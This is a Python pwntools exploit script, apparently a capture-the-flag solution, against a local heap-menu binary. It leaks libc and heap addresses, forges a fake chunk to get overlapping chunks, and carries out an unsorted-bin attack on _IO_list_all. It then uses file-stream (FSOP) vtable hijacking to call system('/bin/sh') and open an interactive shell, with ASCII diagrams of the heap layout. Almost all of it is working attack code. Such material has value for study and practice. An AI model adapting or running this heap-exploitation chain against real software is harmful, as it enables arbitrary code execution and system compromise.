from pwn import *
# author:     "Chris / sirhc.xyz"
#context(os='linux', arch='amd64',log_level='debug')

p = process('./pwn1')

def g(p):
    gdb.attach(p)
    raw_input()

def add(size,content):
    p.recvuntil("command:\n")
    p.sendline(str(1))
    p.recvuntil("size:\n")
    p.sendline(str(size))
    p.recvuntil("content:\n")
    p.send(content)

def delete(index):
    p.recvuntil("command:\n")
    p.sendline(str(2))
    p.recvuntil("enter index:\n")
    p.sendline(str(index)) 

def show(index):
    p.recvuntil("command:\n")
    p.sendline(str(3))
    p.recvuntil("enter index:\n")
    p.sendline(str(index)) 

def modify(index,content):
    p.recvuntil("command:\n")
    p.sendline(str(4))
    p.recvuntil("enter index:\n")
    p.sendline(str(index)) 
    p.recvuntil("content:\n")
    p.send(content)

add(248,"0"*246+"\n")  #0
add(247,"1"*230+"\n")  #1
add(247,"2"*245+"\n")  #2
add(247,"3"*245+"\n")  #3
add(247,"4"*245+"\n")  #4

######### leak libc,heap address

delete(0)
delete(2)
add(247,"\n")    #0
modify(0,"\x78")
show(0)
libc=u64(p.recv(6).ljust(0x8,"\x00"))-0x3c4b20-88
print hex(libc)
modify(0,"a"*8+"\x30")
show(0)
p.recvuntil("a"*8)
heap=u64(p.recv(6).ljust(0x8,"\x00"))-0x230
print hex(heap)

IO_list_all = libc+0x3c5520
print "IO_list_all : "+hex(IO_list_all)
vtable_addr=heap+0x10
print "vtable_addr "+hex(vtable_addr)
system=libc+0x45390
print "system "+hex(system)


#########  do unlink and comply overlap chunk. Get a chunk that is placed in unsorted_bin and size is 0x1f0.

fd=heap
bk=heap
modify(0,p64(heap+0x210)*2+p64(0)+p64(system))  # in chunk #0 ,fake chunk to Bypass unlink check and call_vtable check.
add(248,"6"*248+"\n")  #2
modify(2,p64(0)+p64(0xf1)+p64(fd)+p64(bk)+"\x00"*0xd0+p64(0xf0))
'''
now chunk Overview

chunk#2_head         mem                   chunk#3_head       mem
|                     |                         |             |
+-----------+---------+----+-----+----+----+----+------+------+----+----+------+
|           |         |fake|fake |fake|fake| D  | prev | size |    |    |      |
|           |         |prev|size | fd | bk | A  | size | &flag|    |    |      |
| prev_size |size&flag|size|&flag| |  | |  | T  |=0xf0 |=0x100|  ..| .. |  ..  |
| =0        |=0x101   |=0x0|=0xf1| |  | |  | A  |      |      |    |    |      |
|           |         |    |     | |  | |  |    |      |      |    |    |      |
+-----------+---------+----+-----+-|--+-|--+----+------+------+----+----+------+
                      ^            |    |
                      |            |    |
               fake_chunk_head     +-+--+
                      |              |
               +------+              |
               |                     V
               |                  chunk#0
               |       +------+------+-------+-------+---------+
               |       | prev | size |       |       |         |
               |       | size | &flag|fd=    |bk=    |         |
               |       |=0x0  |=0x101|fake_  |fake_  |         |
               |       |      |      |chunk_ |chunk_ |         |
               |       |      |      |head   |head   |         |
               |       +------+------+---+---+---+---+---------+
               |                         |       |
               +-------------------------+-------+

'''
delete(3)

'''
now chunk Overview

Unsorted_bin --> fake_chunk

chunk#2_head     fake_chunk                        chunk#3_head       mem
|                     |                                  |             |
+-----------+---------+----+------+--------+--------+----+------+------+----+----+------+
|           |         |fake|fake  |        |        | D  | prev | size |    |    |      |
|           |         |prev|size  |arena+88|arena+88| A  | size | &flag|    |    |      |
| prev_size |size&flag|size|&flag |        |        | T  |=0xf0 |=0x100|  ..| .. |  ..  |
| =0        |=0x101   |=0x0|=0x1f1|        |        | A  |      |      |    |    |      |
|           |         |    |      |        |        |    |      |      |    |    |      |
+-----------+---------+----+------+--------+--------+----+------+------+----+----+------+

'''

#########  FSOP   malloc_printerr-> abort -> _IO_flush_all_lockp->jump_field(_IO_overflow->system)

stream = "/bin/sh\x00"+p64(0x61)   # system_call_parameter and link to small_bin[4] 
stream += p64(0)+p64(IO_list_all-0x10)   # Unsorted_bin attack
stream +=p64(1)+p64(2)     # fp->_IO_write_ptr > fp->_IO_write_base
stream = stream.ljust(0xc0,"\x00")  
stream += p64(0)    # mode<=0
stream += p64(0)
stream += p64(0)
stream += p64(vtable_addr)  # vtable_addr --> system

modify(2,stream)
p.recvuntil("command:\n")
p.sendline(str(1))
p.interactive()
